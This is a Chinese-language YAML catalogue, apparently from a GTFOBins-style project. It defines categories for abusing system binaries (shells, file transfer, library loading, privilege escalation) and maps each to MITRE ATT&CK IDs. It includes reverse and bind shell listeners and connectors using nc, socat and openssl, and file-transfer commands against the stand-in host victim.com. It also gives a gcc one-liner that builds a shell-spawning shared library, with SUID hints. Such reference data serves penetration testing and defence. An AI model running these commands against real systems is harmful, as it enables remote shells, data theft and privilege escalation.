shell:
  label: 交互 Shell
  description: 此可执行文件可以生成交互式系统 shell。
  mitre:
  - T1059
  extra:
    tty: &tty
      false: 生成的 shell 只是一个简易 REPL，只能运行简单的终端命令。
    blind: &blind
      true: 命令会被执行，但输出不会返回给操作者。

command:
  label: 命令执行
  description: 此可执行文件可以运行非交互式系统命令。
  mitre:
  - T1059
  extra:
    blind: *blind

reverse-shell:
  label: 反弹 shell
  description: 此可执行文件可以向正在监听的操作者回连一个系统 shell。
  mitre:
  - T1059
  - T1071
  extra:
    tty: *tty
    blind: *blind
    listener:
      tcp-server:
        comment: 可在操作者主机上使用 TCP 服务端接收 shell。
        code: nc -l -p 12345
      tcp-server-tty:
        comment: 可在操作者主机上使用 TCP 服务端接收 shell。
        code: socat file:/dev/tty,raw,echo=0 tcp-listen:12345
      tls-server:
        comment: 可在操作者主机上使用 TLS 服务端接收 shell。
        code: |-
          openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
          openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

bind-shell:
  label: 绑定 shell
  description: 此可执行文件可以把系统 shell 绑定到本地端口，等待操作者连接。
  mitre:
  - T1059
  - T1071
  extra:
    tty: *tty
    blind: *blind
    connector:
      tcp-client:
        comment: 可在操作者主机上使用 TCP 客户端连接到 shell。
        code: nc victim.com 12345
      tcp-client-tty:
        comment: 可在操作者主机上使用 TCP 客户端连接到 shell。
        code: socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345

file-write:
  label: 文件写入
  description: 此可执行文件可以向本地文件写入数据。
  mitre:
  - T1565
  extra:
    binary: &binary
      false: 内容会被该过程损坏或修改，因此可能不适合处理任意二进制数据。

file-read:
  label: 文件读取
  description: 此可执行文件可以读取本地文件数据。
  mitre:
  - T1005
  extra:
    binary: *binary

upload:
  label: 上传
  description: 此可执行文件可以上传本地数据。
  mitre:
  - T1041
  extra:
    binary: *binary
    receiver:
      tcp-client:
        comment: 可在操作者主机上使用 TCP 客户端接收数据。
        code: nc victim.com 12345 >/path/to/output-file
      tcp-server:
        comment: 可在操作者主机上使用 TCP 服务端接收数据。
        code: nc -l -p 12345 >/path/to/output-file
      http-client:
        comment: 可在操作者主机上使用 HTTP 客户端接收数据。
        code: curl victim.com -o /path/to/output-file
      http-server:
        comment: 可在操作者主机上使用 HTTP 服务端接收数据。
        code: nc -l -p 80 | awk 'BEGIN {RS="\r\n\r\n";ORS=""} NR==2' >/path/to/output-file
      ftp-server:
        comment: 可在操作者主机上使用 FTP 服务端接收数据。
        code: python -m pyftpdlib -w -p 21
      ssh-server:
        comment: 可在操作者主机上使用 SSH 服务端接收数据。
      tls-server:
        comment: 可在操作者主机上使用 TLS 服务端接收数据。
        code: |-
          openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
          openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 >/path/to/output-file

download:
  label: 下载
  description: 此可执行文件可以下载远程数据。
  mitre:
  - T1105
  extra:
    binary: *binary
    sender:
      tcp-client:
        comment: 可在操作者主机上使用 TCP 客户端发送数据。
        code: nc victim.com 12345 </path/to/input-file
      tcp-server:
        comment: 可在操作者主机上使用 TCP 服务端发送数据。
        code: nc -l -p 12345 </path/to/input-file
      http-client:
        comment: 可在操作者主机上使用 HTTP 客户端发送数据。
        code: curl victim.com --data-binary @/path/to/input-file
      http-server:
        comment: 可在操作者主机上使用 HTTP 服务端发送数据。
        code: python -m http.server 80
      ftp-server:
        comment: 可在操作者主机上使用 FTP 服务端发送数据。
        code: python -m pyftpdlib -w -p 21
      ssh-server:
        comment: 可在操作者主机上使用 SSH 服务端发送数据。
      tls-server:
        comment: 可在操作者主机上使用 TLS 服务端发送数据。
        code: |-
          openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
          openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file

library-load:
  label: 加载共享库
  description: 此可执行文件可以加载共享库，从而可能在相同执行上下文中运行任意代码。
  mitre:
  - T1574
  extra:
    payload: |-
      例如，可以使用以下命令创建一个最小共享库（`lib.so`），它会在加载时生成 shell：

      ```
      echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
          | gcc -w -fPIC -shared -o lib.so -x c -
      ```

      在 SUID 上下文中，按常规为 shell 添加 `-p` 参数。如果可执行文件拥有 `CAP_SETUID` capability，可考虑预先调用 `setuid(0);`。

privilege-escalation:
  label: 权限提升
  description: 此可执行文件可通过间接方式启用更高权限，例如设置 SUID 位或修改另一个可执行文件的所有权，从而提供权限提升机制。
  mitre:
  - T1548

inherit:
  label: 继承
  description: 此可执行文件可以继承另一个条目的功能。
